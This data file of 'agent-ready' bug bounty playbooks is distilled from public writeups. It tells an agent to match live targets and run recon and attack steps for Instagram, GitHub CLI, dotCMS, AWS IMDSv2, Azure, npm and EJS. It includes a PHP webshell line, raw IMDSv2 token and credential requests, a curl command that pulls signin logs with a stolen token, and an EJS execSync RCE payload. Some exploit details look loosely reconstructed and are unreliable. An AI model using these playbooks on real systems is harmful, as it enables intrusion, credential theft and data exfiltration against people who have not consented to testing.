description: Agent-ready bug bounty playbooks extracted from writeups.json. Same schema as agent_playbooks_github.json — safe to merge.

usage.step_1: Load tactic_index.json and look up your target's technology under by_technology to get relevant playbook IDs.
usage.step_2: Filter by by_access_level matching your current access to the target.
usage.step_3: Prioritize IDs in high_confidence and quick_wins lists for best hit rate.
usage.step_4: Load matching playbooks from this file by their 'id' field.
usage.step_5: Check trigger_conditions.prerequisites and applicability_signals against the live target.
usage.step_6: If conditions match, run attack_playbook.recon_steps first, then attack_steps.
usage.step_7: Confirm with success_indicators. If failed, use failure_indicators to pivot.

meta.title: Remotely permanent crash any Instagram user via permanent DoS in user DM's.

trigger_conditions.when_to_apply: When the target application allows adding users to groups, and there exist or can be created special user accounts with no string representation in their username (e.g., developer test accounts).
prerequisites: Attacker must have an authenticated Instagram account.
Existence of or ability to create an Instagram account with an invalid or null username string.
applicability_signals: Ability to initiate group DM creation.
Ability to add other users to a group.
Observation of application crashes when viewing specific user profiles (indicating potential for invalid username handling).
skip_if: WAF blocks group creation requests.
Instagram platform sanitizes or rejects invalid usernames during group member addition.
Target user profiles are always rendered successfully even with malformed username data.

recon_steps: Step 1: Identify or create an Instagram account with a username that has no valid string representation (e.g., a NULL username or developer test account).
Step 2: Attempt to view the profile of such a specially crafted account to confirm it causes a client-side crash or unexpected behavior.
attack_steps: Step 1: Initiate the creation of a new group direct message.
Step 2: Add the specially crafted NULL username account as a member of the group.
Step 3: Add the target victim's Instagram account to the same group.
Step 4: Observe the impact on the victim's Instagram application.
payloads_or_patterns: Capture group member adding request and modify the targeted userID with a NULL username Instagram account userID.
tools_recommended: Burp Suite: To intercept and modify group creation and member addition requests.
Instagram mobile application: For creating accounts and testing crashes.
success_indicators: The victim's Instagram application permanently crashes or becomes unusable after being added to the group.
The victim reports being unable to access or use the Instagram app.
failure_indicators: Group creation fails.
Adding the NULL username account to the group results in an error.
Adding the victim to the group does not cause any adverse effects on their app.
If the above fails, investigate other API endpoints related to user profiles or messaging that might handle malformed data.

playbooks.impact: Permanent denial-of-service (DoS) for any Instagram user, rendering their application unusable with zero user interaction required from the victim.
playbooks.key_lesson: Investigate the handling of malformed or non-standard user identifiers (like null usernames) in group messaging functionalities, as they can lead to client-side crashes and denial-of-service vulnerabilities.

meta.title: [UNPATCHED] Cli: gh run download implementation allows overwriting git repository configuration upon artifacts downloading

trigger_conditions.when_to_apply: When an attacker can provide a malicious GitHub repository to a user who then uses the `gh run download` command on that repository.
prerequisites: The target user has the GitHub CLI installed and configured.
The attacker can host a GitHub repository containing specially crafted artifacts.
applicability_signals: The user intends to download artifacts from a GitHub Actions run using `gh run download`.
skip_if: The GitHub CLI has been updated to sanitize or restrict artifact filenames.
The target environment prevents writing to the `.git` directory.

recon_steps: Verify the installed version of GitHub CLI (gh) on the target system. Older versions are vulnerable.
Identify GitHub Actions runs for a target repository that can be triggered by the attacker.
attack_steps: Step 1: Craft a malicious GitHub repository. Within this repository, create an artifact that, when downloaded and extracted by `gh run download`, will create a file named `.git/commondir` with specific content, or overwrite existing files in the `.git` directory.
Step 2: Host this malicious repository and trick the victim into cloning it.
Step 3: Instruct the victim to run `gh run download` within the cloned repository. This can be done interactively or by specifying a specific run ID.
Step 4: After the download, the attacker's crafted files in the `.git` directory will alter the git configuration.
Step 5: The victim may then run `git fetch` or other git commands which will trigger the RCE based on the modified git configuration (e.g., by executing a command specified in `.git/commondir`).
payloads_or_patterns: Artifact payload designed to create/overwrite files in the target's `.git` directory, e.g., `.git/commondir`.
Example malicious artifact content: `gitdir: ../.git/` (This content can vary to achieve different effects, including RCE via `commondir` overwrite).
Subsequent command to trigger exploit: `git fetch` or similar git commands.
tools_recommended: GitHub CLI (gh)
Git
Custom scripts to create malicious artifacts.
success_indicators: The `.git/commondir` file (or other crafted git config files) exists in the repository directory after `gh run download`.
Subsequent git commands (e.g., `git fetch`) execute arbitrary commands as dictated by the crafted git configuration.
Confirmation of arbitrary command execution on the victim's machine.
failure_indicators: The `gh run download` command fails with an error indicating that files cannot be overwritten in the `.git` directory. This suggests a patched version or mitigation is in place. Pivot to other vulnerabilities.
The download completes successfully, but subsequent `git` commands do not exhibit unexpected behavior. Re-evaluate the crafted artifact and the trigger mechanism.

playbooks.impact: Arbitrary Code Execution (RCE) on the victim's machine by overwriting critical git repository configuration files when downloading artifacts from a malicious repository using the GitHub CLI.
playbooks.key_lesson: When downloading artifacts or files from untrusted sources via command-line tools, always ensure that the tool properly sanitizes and restricts file path and name creation, especially when writing to sensitive directories like `.git`.

meta.title: Hacking a Bank by Finding a 0day in DotCMS

trigger_conditions.when_to_apply: When the target is running dotCMS and a vulnerability in the content upload API can be identified or is known.
prerequisites: Target must be running a vulnerable version of dotCMS.
applicability_signals: Existence of the /api/content endpoint.
API endpoints not requiring authentication.
Source code analysis revealing unsafe multipart file upload handling.
skip_if: All requests to /api/content result in authentication errors.
WAF blocks requests to /api/content.
dotCMS version is confirmed to be patched against CVE-2022-26352.

recon_steps: Step 1: Identify the dotCMS version through HTTP headers or HTML source code.
Step 2: Search for known vulnerabilities in the identified dotCMS version, particularly around API endpoints and file uploads.
Step 3: If source code is available, analyze `com.dotcms.rest.ContentResource.java` for unrestricted file upload vulnerabilities.
Step 4: Test `/api/content` endpoint for multipart file upload capabilities without authentication.
attack_steps: Step 1: Craft a multipart request to the `/api/content` endpoint.
Step 2: Include a file in the multipart request with an extension that might be allowed (e.g., .jsp, .php, .js) and potentially a null byte in the filename to bypass simple extension checks.
Step 3: Attempt to upload a file to a known web-accessible directory or a directory where existing JavaScript files reside.
Step 4: If a web shell is not directly possible, attempt to overwrite existing JavaScript files with malicious content.
Step 5: Verify if the uploaded file can be accessed or if the overwritten JavaScript executes malicious code.
payloads_or_patterns: A multipart POST request to /api/content containing a file part. The filename can be crafted to exploit path traversal or overwrite specific files, e.g., `../../../../html/js/my-script.js`
Content of the uploaded file: `<script>alert('XSS')</script>` or a simple PHP webshell like `<?php system($_GET['cmd']); ?>`
tools_recommended: Burp Suite Repeater: To manually craft and modify multipart requests.
curl: To automate file uploads from the command line.
DotCMS Source Code: For in-depth analysis of the vulnerability.
success_indicators: HTTP response indicating successful upload (e.g., 200 OK).
Ability to access the uploaded file at a predictable URL.
Execution of injected JavaScript code in the browser (e.g., an alert box).
Successful execution of commands via a webshell.
failure_indicators: 400 Bad Request or 403 Forbidden responses for file upload attempts.
Error messages indicating invalid file types or upload failures.
Inability to access the uploaded file or observe its effect.
If unable to upload to a web-accessible directory, attempt to overwrite critical JavaScript files and check for client-side execution.

playbooks.impact: Arbitrary file upload to any directory on the local system, potentially leading to Remote Code Execution (RCE) if a web-accessible directory is found or if existing files can be replaced with executable code. This could allow an attacker to compromise the entire server.
playbooks.key_lesson: Always audit multipart file upload endpoints for unrestricted write capabilities, paying close attention to potential path traversal and the ability to overwrite existing files, especially those in web-accessible locations.

meta.title: Vulnerable GitHub Actions Workflows Part 2: Actions That Open the Door to CI/CD Pipeline Attacks

trigger_conditions.when_to_apply: This technique is applicable when a project utilizes third-party GitHub Actions that have known vulnerabilities, particularly those that could lead to compromise of the CI/CD pipeline.
prerequisites: The target project uses GitHub Actions in its CI/CD pipeline.
applicability_signals: Analysis of the project's `.github/workflows/` directory reveals the use of specific third-party GitHub Actions.
Information regarding known vulnerabilities in those specific third-party actions is available.
skip_if: The project does not use GitHub Actions.
All utilized third-party GitHub Actions are known to be secure or have been updated to patch known vulnerabilities.

recon_steps: Step 1: Identify all GitHub Actions workflows in the target repository (e.g., by examining `.github/workflows/` directory).
Step 2: For each workflow, identify the specific third-party actions being used and their versions.

Step 3: Cross-reference the identified third-party actions and their versions against known vulnerability databases (e.g., CVE databases, GitHub Security Advisories, vendor advisories) to find potential exploits.
attack_steps: Step 1: If a vulnerable third-party action is identified, determine the nature of the vulnerability (e.g., path traversal, command injection, insecure deserialization).
Step 2: Craft a malicious input or configuration that exploits the identified vulnerability within the context of the GitHub Actions workflow.
Step 3: If the action processes user-supplied input or configuration files, modify those inputs to contain the malicious payload.
Step 4: If the action has access to secrets or environment variables, attempt to exfiltrate them by leveraging the vulnerability.
Step 5: If the action executes code, attempt to inject malicious commands to gain control over the runner or other pipeline resources.
payloads_or_patterns: Varies based on the specific vulnerability in the third-party action. Examples could include specially crafted file paths for path traversal, shell commands for command injection, or malicious serialized objects.
tools_recommended: GitHub CLI (gh) for interacting with GitHub repositories and workflows.
Vulnerability scanning tools (e.g., trivy, Grype) to identify vulnerable dependencies.
Static Analysis Security Testing (SAST) tools to analyze workflow files for potential misconfigurations or insecure patterns.
Burp Suite or similar proxy for intercepting and modifying network requests if the action communicates externally.
success_indicators: Unauthorized access to secrets stored in GitHub.
Execution of arbitrary commands on the CI/CD runner.
Modification or exfiltration of sensitive data processed by the pipeline.
Successful lateral movement within the CI/CD infrastructure.
failure_indicators: The third-party action is not vulnerable or has been patched.
The exploit payload does not trigger the vulnerability.
The CI/CD pipeline environment has strong isolation or security controls preventing exploitation.
The action does not process user-controlled input in a way that allows for exploitation.

playbooks.impact: Compromise of the CI/CD pipeline can lead to unauthorized access to source code, deployment of malicious code, exfiltration of sensitive credentials and secrets, and potential compromise of downstream systems and services.
playbooks.key_lesson: Continuously monitor and audit the versions of third-party GitHub Actions used in CI/CD pipelines, and prioritize updating them to patched versions to prevent known vulnerabilities from being exploited.

meta.title: Exploitation of an SSRF vulnerability against EC2 IMDSv2

trigger_conditions.when_to_apply: When an authenticated user can trigger requests to arbitrary URLs via the Confluence 'makeRequest' gadget endpoint, and the target infrastructure is hosted on AWS and uses IMDSv2.
prerequisites: Target is hosted on AWS
Target uses IMDSv2 for EC2 instance metadata
Authenticated user can access the '/plugins/servlet/gadgets/makeRequest' endpoint
applicability_signals: The '/plugins/servlet/gadgets/makeRequest' endpoint is present and accepts a 'url' parameter.
The 'makeRequest' function allows specifying 'httpmethod', 'postData', and 'headers'.
Burp Collaborator or similar receives a DNS or HTTP request when a crafted URL is sent to the 'makeRequest' endpoint.
skip_if: No SSRF vulnerability is found at the '/plugins/servlet/gadgets/makeRequest' endpoint.
The target is not hosted on AWS.
The target uses IMDSv1 or has IMDSv2 disabled/misconfigured in a way that doesn't require the token.
The 'makeRequest' endpoint does not allow controlling HTTP methods or headers, preventing the IMDSv2 token retrieval.

recon_steps: Step 1: Identify Atlassian Confluence instances in the target scope.

Step 2: Probe the '/plugins/servlet/gadgets/makeRequest' endpoint with Burp Collaborator to confirm SSRF by sending a request to a Collaborator domain. Use POST method with appropriate headers like 'X-Atlassian-Token: no-check'.
Step 3: If SSRF is confirmed, attempt to port scan the internal network by sending requests to 127.0.0.1 on various ports. If internal ports are identified (e.g., 80, 5000), attempt to access them.
Step 4: Confirm if the target infrastructure is hosted on AWS by attempting to access internal AWS services or by observing AWS-specific headers/responses.
attack_steps: Step 1: Send a PUT request to the EC2 IMDSv2 token endpoint using the identified SSRF vulnerability: `http://169.254.169.254/latest/api/token`. Include the header `X-aws-ec2-metadata-token-ttl-seconds: 21600` within the `headers` parameter of the `makeRequest` function.
Step 2: Capture the session token returned by the PUT request.

Step 3: Send a GET request to the IMDSv2 metadata endpoint (e.g., `http://169.254.169.254/latest/meta-data/profile`) using the SSRF vulnerability. Include the captured session token in the `X-aws-ec2-metadata-token` header within the `headers` parameter of the `makeRequest` function.
Step 4: Analyze the response for sensitive AWS metadata such as IAM role credentials.
payloads_or_patterns:
PUT http://169.254.169.254/latest/api/token HTTP/1.1
Host: 169.254.169.254
X-aws-ec2-metadata-token-ttl-seconds: 21600

GET http://169.254.169.254/latest/meta-data/profile HTTP/1.1
Host: 169.254.169.254
X-aws-ec2-metadata-token: <SESSION_TOKEN>
tools_recommended: Burp Suite (Collaborator, Intruder)
curl
success_indicators: A valid session token is returned from the PUT request to `/latest/api/token`.
Sensitive AWS metadata, such as IAM role names or credentials, is returned in the response to the GET request to `/latest/meta-data/profile`.
failure_indicators: 401 Unauthorized responses for the token request: Indicates IMDSv2 is enforced but the SSRF cannot bypass it or the target is not AWS.
Connection timed out or refused for http://169.254.169.254: Indicates the endpoint is not reachable or blocked.
Successful SSRF to other internal endpoints but not to 169.254.169.254: Suggests network segmentation or firewall rules preventing access to the metadata service.
403 Forbidden responses from IMDSv2: Indicates the token is malformed or expired.

playbooks.impact: Obtain AWS EC2 instance metadata, potentially including sensitive information like IAM role credentials, which can lead to further compromise of AWS resources, data exfiltration, or unauthorized actions within the AWS environment.
playbooks.key_lesson: When targeting AWS environments with SSRF vulnerabilities, always attempt to exploit the EC2 Instance Metadata Service (IMDS), paying close attention to IMDSv2 authentication requirements and leveraging the SSRF to construct the necessary authenticated requests.

meta.title: Wiz Research discovers "ExtraReplica"— a cross-account database vulnerability in Azure PostgreSQL
meta.authors: Ronen Shustin, Sagi Tzadik, Nir Ohfeld, Shir Tamari

trigger_conditions.when_to_apply: This technique is applicable when an attacker has code execution on their own Azure PostgreSQL Flexible Server instance and wants to gain unauthorized read access to other customers' PostgreSQL databases.
prerequisites: Attacker has code execution on their own PostgreSQL Flexible Server instance.
Target Flexible Server instance is not configured with explicit VNet network configuration (Private access).
applicability_signals: Observable vulnerability in Azure's PostgreSQL Flexible Server service allowing code execution.
Network access to other customer instances within the same subnet.
Overly permissive regular expression validation for certificate's Common Name (CN) with a wildcard (.*) at the end.
skip_if: Target Flexible Server instance uses Private access (VNet configuration).

recon_steps: Step 1: Identify a vulnerability in Azure's PostgreSQL Flexible Server service to gain code execution on your own instance.
Step 2: Perform network reconnaissance within the service's internal network to discover network access to other customer instances in the same subnet.
Step 3: Analyze the authentication process for regular expression validation of certificate Common Names (CN) to identify over-permissive patterns (e.g., using '.*').
attack_steps: Step 1: Exploit the code execution vulnerability on your PostgreSQL Flexible Server instance.
Step 2: Identify the over-permissive regex for certificate CN validation in the authentication process.

Step 3: Issue a certificate for your own domain (e.g., wiz-research.com) with a crafted Common Name that matches the vulnerable regex, targeting a specific customer's database replication hostname (e.g., replication.<target_db_id>.database.azure.com.wiz-research.com).
Step 4: Use the issued certificate to log in to the targeted PostgreSQL instance using the modified CN.
Step 5: Once authenticated, replicate the targeted PostgreSQL instance to gain read access to the customer's database.
tools_recommended: Certificate generation tools (e.g., OpenSSL) for creating custom certificates.
Network scanning tools to map internal network access.
PostgreSQL client tools to connect and query databases.
success_indicators: Successful connection to a targeted PostgreSQL database using a certificate issued to an arbitrary domain.
Ability to replicate the targeted PostgreSQL instance.
Unauthorized read access to another customer's PostgreSQL database data.
failure_indicators: Certificate validation fails, indicating the regex is not vulnerable or the crafted CN is incorrect.
Connection denied, suggesting authentication bypass was not successful.
403 Forbidden or other access denied errors when trying to access or replicate the database.

playbooks.impact: Unauthorized read access to other customers' Azure PostgreSQL Flexible Server databases, bypassing tenant isolation. This could lead to sensitive data exposure.
playbooks.key_lesson: Always validate certificate Common Name (CN) regular expressions for potential wildcard abuse that could lead to authentication bypass and cross-tenant data access.

meta.title: Encrypting our way to SSRF in VMWare Workspace One UEM (CVE-2021-22054)
meta.authors: Keiran Sampson, James Hebden, Shubham Shah

tech_stack_fingerprints: web.config file structure for ASP.NET applications

trigger_conditions.when_to_apply: When the target application exposes a handler like BlobHandler.ashx and uses custom encryption for request data.
prerequisites: Access to the target application's network or ability to send requests to it.
applicability_signals: Existence of BlobHandler.ashx endpoint
Observation of custom encryption/decryption routines in .NET DLLs
Network-exposed administrative interface for mobile device management.
skip_if: No discernible encryption mechanism for requests
BlobHandler.ashx is not accessible or returns an error for unauthenticated users.

recon_steps: Step 1: Analyze the web.config files of the deployed UEM applications to identify interesting handlers like BlobHandler.ashx.

Step 2: Load DLLs associated with relevant application components (e.g., WanderingWiFi.AirWatch.Console.Web) into a decompiler (like ILSpy) to understand request handling and identify custom encryption algorithms.
Step 3: Reverse engineer the encryption algorithm used by the application.
attack_steps: Step 1: Construct a malicious request targeting BlobHandler.ashx, encrypting a payload that includes an SSRF-inducing URL (e.g., an internal IP address or a domain pointing to a server controlled by the attacker).
Step 2: Send the encrypted request to the BlobHandler.ashx endpoint.
Step 3: Observe the response for signs of the request being processed by an internal service or for any callbacks to attacker-controlled infrastructure.
payloads_or_patterns: Encrypted payload containing: {'url': '<TARGET_URL>', 'method': 'GET', 'body': ''} where <TARGET_URL> is an internal or external URL to probe.
The encryption/decryption logic will be custom and needs to be implemented based on reverse engineering.
tools_recommended: ILSpy or similar .NET decompilers
Custom scripting (e.g., Python with cryptography libraries) to implement the encryption/decryption logic
Burp Suite or ZAP for intercepting and replaying requests
success_indicators: Receiving a response from an unexpected internal service.
A callback to a listener controlled by the attacker (e.g., on a Collaborator server) indicating the target server made a request to the specified <TARGET_URL>.
Successful exfiltration of data if the SSRF allows for it.
failure_indicators: Requests to BlobHandler.ashx are blocked by a WAF.

The application returns a generic error or does not process the request as expected, indicating the encryption/decryption logic was incorrect or the payload format is invalid. Pivot to analyzing other handlers or different versions of the software.
No callbacks or internal responses observed after multiple attempts. Re-verify the encryption algorithm and payload construction.

playbooks.impact: Allows an unauthenticated attacker to make arbitrary HTTP requests from the VMware Workspace One UEM server to any internal or external resource, potentially leading to information disclosure, remote code execution (if services behind the SSRF are vulnerable), or further network pivoting.
playbooks.key_lesson: Thoroughly analyze custom encryption and encoding schemes in web applications, as they can obscure vulnerabilities like SSRF or SQLi from static analysis and standard tooling.

meta.title: Azure Monitor – Malicious KQL Query

trigger_conditions.when_to_apply: This technique is applicable when an attacker can execute KQL queries within an Azure Monitor Log Analytics workspace that is configured to use cross-service queries with Azure Data Explorer.
prerequisites: Attacker must have authenticated access to the target Azure Monitor Log Analytics workspace.
The target workspace must be configured for cross-service queries to Azure Data Explorer.
applicability_signals: Presence of KQL query execution capabilities within the target application.
Evidence of Azure Data Explorer integration or cross-service query functionality.
skip_if: The target Azure Monitor instance does not support cross-service queries to Azure Data Explorer.
The attacker cannot authenticate to the target Log Analytics workspace.

recon_steps: Step 1: Identify Azure Monitor Log Analytics workspaces accessible to the attacker.
Step 2: Investigate if the target Log Analytics workspace utilizes Azure Data Explorer for cross-service queries by reviewing Azure documentation and configurations.
attack_steps: Step 1: Set up a Man-in-the-Middle (MITM) proxy server to intercept HTTP requests.
Step 2: Craft a malicious KQL query using the `adx()` function to query an attacker-controlled Azure Data Explorer endpoint.
Step 3: Configure the `adx()` function's cluster address to point to the attacker's MITM proxy server.
Step 4: Execute the malicious KQL query within the target Log Analytics workspace.
Step 5: The MITM proxy will capture the JWT access token from the request made by Azure Monitor to the attacker-controlled ADX endpoint.
Step 6: Use the captured access token to exfiltrate sensitive data from the target workspace (e.g., signin logs).
payloads_or_patterns: KQL query: `externaldata(token:string) ["https://<ATTACKER_CONTROLLED_ADX_ENDPOINT>/v1/rest/mgmt?query=print current_principal_token() "] with (format="json")` (Conceptual, actual exploitation uses a proxy to capture the token)
MITM proxy configuration to intercept requests to `*.kusto.windows.net` and capture `Authorization: Bearer <TOKEN>` header.

Curl command to extract signin logs using the captured token: `curl "https://ade.loganalytics.io/<TARGET_WORKSPACE_RESOURCE_ID>/v2/rest/query" -H "authorization: Bearer <CAPTURED_TOKEN>" -H 'content-type: application/json; charset=UTF-8' -H 'accept: application/json' --data-raw '{"db":"<TARGET_WORKSPACE_NAME>","csl":"SigninLogs\r\n| take 10","properties":{"Options":{"servertimeout":"00:04:00","queryconsistency":"strongconsistency","query_language":"csl","request_readonly":false,"request_readonly_hardline":false}}}'`
tools_recommended: Burp Suite (for MITM proxy functionality)
Custom script (e.g., Node.js with Express) for the MITM proxy to capture tokens and log requests.
Curl for executing the exfiltration query.
success_indicators: The MITM proxy successfully captures a valid JWT access token from the Azure Monitor request.
The exfiltration `curl` command returns sensitive data (e.g., signin logs) from the target workspace.
Successful exfiltration of data using the obtained access token.
failure_indicators: MITM proxy does not intercept any relevant requests or capture tokens: Indicates incorrect proxy configuration or that cross-service query is not being triggered as expected.
Exfiltration `curl` command returns an error or empty data: Suggests the captured token is invalid, expired, or lacks sufficient permissions for the target data.

playbooks.impact: An attacker can exfiltrate sensitive data from an Azure Monitor Log Analytics workspace, including authentication logs and potentially other sensitive telemetry data, by leveraging a compromised access token. This can lead to further account compromise, sensitive data exposure, and privilege escalation.
playbooks.key_lesson: When interacting with cloud services that support cross-service queries, always validate how external data sources are referenced and ensure that sensitive credentials like access tokens are not inadvertently exposed through query parameters or function calls.

meta.title: Privileged account creation via Mass Assignment towards a full compromise using a Stored XSS
meta.vuln_type: Privilege Escalation | Stored XSS | Mass Assignment

trigger_conditions.when_to_apply: When the application uses a user creation endpoint that directly maps JSON input to database models without strict attribute filtering, and there are distinct privilege levels or roles that can be assigned.
prerequisites: Attacker can make POST requests to the user signup endpoint.
applicability_signals: API endpoint `/users/signup/webapp` exists and accepts POST requests.
User model attributes like `isAdmin` and `roles` are present.
The code logic shows that user input is mapped to the `User` model and then specific roles are removed, rather than only allowing permitted attributes.
skip_if: The signup endpoint explicitly validates and filters all incoming JSON fields, rejecting any unexpected ones.
The application enforces strict role validation on creation and does not allow arbitrary role assignment via JSON input.

recon_steps: Step 1: Analyze the source code or observe API requests/responses for the user signup endpoint (`/users/signup/webapp`). Identify the expected JSON payload structure and the database model it maps to.
Step 2: Examine the `User` model definition and associated `UserRole` enumeration to understand the different roles and privilege levels available (e.g., ADMIN, BENEFICIARY, JOUVE).
Step 3: Identify attributes within the `User` model that grant elevated privileges (e.g., `isAdmin`, `roles`).
attack_steps: Step 1: Craft a POST request to `/users/signup/webapp` with a JSON payload. Include standard user registration fields (email, password, etc.) and attempt to include an elevated role, such as `"roles": ["ADMIN"]`, or set `"isAdmin": true`, in the JSON payload.

Step 2: If the initial attempt to gain admin privileges fails directly, analyze the code to see if specific roles are removed post-mapping (e.g., `new_user.remove_admin_role()`). If so, attempt to send a payload that bypasses this removal or exploits a role that is not explicitly removed.

Step 3: Based on the writeup, the `JOUVE` role was not explicitly handled. Send a POST request to `/users/signup/webapp` with `"roles": ["JOUVE"]` and check if this grants unexpected administrative privileges or access.

Step 4: Once a privileged account (or an account with unexpected access) is created, attempt to leverage the identified Stored XSS vulnerability within the administration panel using the privileged account's session.

Step 5: Craft a Stored XSS payload designed to execute within the admin panel's context. This could involve creating content that an administrator would view, such as a profile description or a message, and injecting JavaScript.
Step 6: Navigate the administration panel as a standard user and trigger the administrator's interaction with the malicious content, aiming to execute the XSS payload in the administrator's browser.
tools_recommended: Burp Suite: To intercept and modify requests to `/users/signup/webapp`, analyze responses, and craft XSS payloads.
Postman or curl: For sending crafted HTTP requests.
success_indicators: Successful account creation with a `JOUVE` role.
The created `JOUVE` account having administrative privileges (e.g., access to admin panel features, ability to manage users).
Execution of the Stored XSS payload in the administrator's browser when they interact with content created by the attacker.
failure_indicators: Account creation fails with validation errors for unexpected roles.
The `JOUVE` role does not grant administrative privileges.

The Stored XSS payload does not execute when interacted with by an administrator (e.g., output encoding prevents execution). Pivot: If XSS fails, focus on other potential injection points in the admin panel or explore different mass assignment vectors.

playbooks.impact: An attacker can create an account with administrative privileges (via mass assignment exploiting the 'JOUVE' role), leading to full compromise of the application. From the privileged account, the attacker can inject a stored XSS payload into the administration panel, which, when viewed by an administrator, can lead to further compromise, such as stealing administrator session cookies or performing actions on behalf of the administrator.
playbooks.key_lesson: Always sanitize and strictly validate all incoming JSON payloads against a predefined allowlist of attributes, especially for sensitive endpoints like user creation. Do not rely on post-mapping attribute removal as the sole security measure, as this is prone to bypasses when new attributes or roles are introduced.

meta.title: Package Planting: Are You [Unknowingly] Maintaining Poisoned Packages?

trigger_conditions.when_to_apply: This technique was applicable when npm allowed adding users as package maintainers without their explicit consent or notification.
prerequisites: Attacker can publish an npm package.
applicability_signals: Previous npm behavior allowed adding arbitrary users as maintainers without confirmation.
skip_if: npm has implemented a confirmation mechanism for adding new package maintainers.

recon_steps: Step 1: Identify popular and trusted npm packages and their maintainers.
Step 2: Confirm that the npm platform allows adding new maintainers without explicit user consent.
attack_steps: Step 1: Create and publish a malicious npm package (e.g., `fb_npm_package`).
Step 2: Add trusted users (e.g., owners of `lodash` or Facebook's npm profiles) as maintainers of the malicious package.
Step 3: Remove yourself as the original publisher of the malicious package, making the trusted users the sole apparent maintainers.
payloads_or_patterns: Create an npm package and use `npm publish`.
Use `npm owner add <user_id> <package_name>` to add maintainers.
tools_recommended: npm CLI
success_indicators: Trusted users are listed as maintainers of a malicious package without their knowledge or consent.
Other developers are tricked into installing the malicious package due to the trusted maintainer association.
failure_indicators: The npm platform rejects the addition of a maintainer without confirmation, indicating the vulnerability is patched.
An invitation email is sent to the target user for confirmation, showing the patch is in effect.

playbooks.impact: An attacker could associate malicious packages with the reputation of trusted developers or organizations, leading to widespread installation of compromised code, reputational damage, or even developer defamation and platform bans.
playbooks.key_lesson: Always verify that package management platforms require explicit consent and confirmation before adding new maintainers to prevent unauthorized association with malicious code.

meta.title: EJS, Server side template injection RCE (CVE-2022-29078)

trigger_conditions.when_to_apply: When the target application uses EJS for server-side templating and exposes an endpoint that allows user-controlled input to be processed as template options, specifically 'view options'.
prerequisites: Target application uses EJS templating.
An endpoint exists that renders EJS templates using user-controlled data.
The application framework (like Express.js) passes 'view options' from data to EJS without proper sanitization.
applicability_signals: The application uses `res.render()` or similar EJS rendering functions.
User-supplied input is passed to the rendering function.
The `settings['view options']` property is accessible and mutable via user input.
skip_if: EJS is not used.
User input is strictly sanitized and does not reach template option processing.
The framework does not expose 'view options' or does so in a sanitized manner.

recon_steps: Analyze the EJS library's source code, specifically the `render` and `renderFile` functions, to understand how user data and options are merged.
Identify the `_OPTS_PASSABLE_WITH_DATA` list and the `utils.shallowCopyFromList` function to understand which options can be overridden via data.
Examine the `renderFile` function for the handling of `data.settings['view options']` and the `utils.shallowCopy` function to confirm unrestricted copying of these options.
attack_steps: Construct an HTTP request to an endpoint that renders an EJS template.
Pass user-controlled data in the request query parameters or body.
Inject a malicious payload into a parameter that will be copied into EJS options via `data.settings['view options']`.

The payload should leverage EJS's ability to execute JavaScript within template expressions. A common RCE payload involves `_be` (bind and evaluate) or similar internal functions that can lead to arbitrary code execution.
Example: Send a GET request to `/page?id=<script>console.log(process.env)</script>` (if `id` is rendered directly and not sanitized).
payloads_or_patterns: The writeup mentions the RCE exploit involves `data.settings['view options']`. A common exploit pattern for SSTI leading to RCE in EJS relies on injecting code into options that are then evaluated. A known payload for CVE-2022-29078 is:

Or more generically, to achieve RCE:
`?__proto__.outputFunctionName=__constructor.constructor('return process.mainModule.require(\'child_process\').execSync(\'<your_command>\')')()`
The writeup also shows an example using `debug = true` for information disclosure and `delimiter` manipulation for ReDoS, but the RCE is the primary focus for this playbook.
tools_recommended: Burp Suite (Repeater/Intruder): To craft and send various payloads.
Node.js Debugger: For local analysis of EJS code flow.
Manual inspection of EJS source code.
success_indicators: Execution of arbitrary commands on the server, such as `whoami` returning the server user's identity.
Receiving output from executed commands in the HTTP response.
Server-side errors or exceptions indicating code execution attempts.
If the payload attempts to write files or establish network connections, observe these side effects.
failure_indicators: Receiving a generic error or stack trace that does not indicate command execution.
No discernible change in application behavior or response content.
WAF blocking the request if specific patterns are used.
If the `__proto__` manipulation is blocked, try other properties that might be recursively copied into options.

playbooks.impact: Remote Code Execution (RCE) on the server. This allows an attacker to execute arbitrary commands, potentially leading to complete system compromise, data theft, or further network exploitation.
playbooks.key_lesson: Always scrutinize how user-supplied data is merged into internal configuration or options objects, especially when those options influence code execution or parsing, as this can lead to Server-Side Template Injection (SSTI) and Remote Code Execution (RCE).

meta.title: Adventures Into The MeowCorp Bug Bounty Program

trigger_conditions.when_to_apply: This playbook is applicable when a subdomain enumeration reveals a Git repository exposed via HTTP, specifically the /.git/config file.
prerequisites: Discovery of a subdomain that responds to HTTP requests.
applicability_signals: A GET request to /.git/config returns a 200 OK status code and the response body contains Git configuration details.
skip_if: Requests to /.git/config result in 404 Not Found or other non-200 status codes.

recon_steps: Step 1: Perform subdomain enumeration on the target domain (e.g., meowcorp.io) using tools like subfinder or amass.
Step 2: For each discovered subdomain, perform content discovery to identify files and directories, specifically looking for a /.git directory. Use tools like dirsearch or ffuf with common wordlists.
Step 3: Attempt to retrieve the /.git/config file via HTTP GET request for any subdomains where a /.git directory might exist.
attack_steps: Step 1: If /.git/config is found, use GitTools (git-dumper) to extract the entire contents of the .git directory.
Step 2: Analyze the extracted files, paying close attention to commit history and any linked remote repositories. Look for references to personal GitHub profiles or internal project names.
Step 3: If a personal GitHub profile is referenced, investigate that profile for public repositories that might contain sensitive information or CI/CD configurations.
Step 4: If a CI/CD configuration file (e.g., .github/workflows/CICD.yml) is found, analyze it for hardcoded credentials, especially SSH keys.
payloads_or_patterns: Use of GitTools (git-dumper) to clone the .git repository.
tools_recommended: subfinder: For subdomain enumeration.
amass: For subdomain enumeration.
dirsearch: For content discovery.
ffuf: For content discovery.
GitTools (git-dumper): To clone the .git repository.
Git CLI: To analyze commit history and repository contents.
success_indicators: Successful retrieval of the /.git/config file.
Discovery of SSH credentials (private key and potentially username) within the Git repository's history or CI/CD files.
Successful SSH login to the target server using extracted credentials.
Execution of `sudo -l` command yielding `(ALL:ALL) ALL` permissions, allowing privilege escalation to root.
failure_indicators: Requests to /.git/config return 404 or other non-200 status codes: Indicates the Git repository is not exposed via HTTP at this path. Move to other recon avenues.
Git repository is empty or only contains static files: Continue analysis for other clues, but this specific path is exhausted.
No sensitive information found in commit history or CI/CD files: The initial clue did not lead to further exploitation via this path. Pivot to other findings or recon steps.

playbooks.impact: Gaining unauthorized SSH access to a production server, potentially leading to a root shell and complete compromise of the server.
playbooks.key_lesson: Always perform content discovery on subdomains, specifically looking for .git directories, as they can inadvertently expose sensitive credentials and source code history.

meta.title: Security issues with cloudflare/odoh-server-go and the ODoH RFC draft

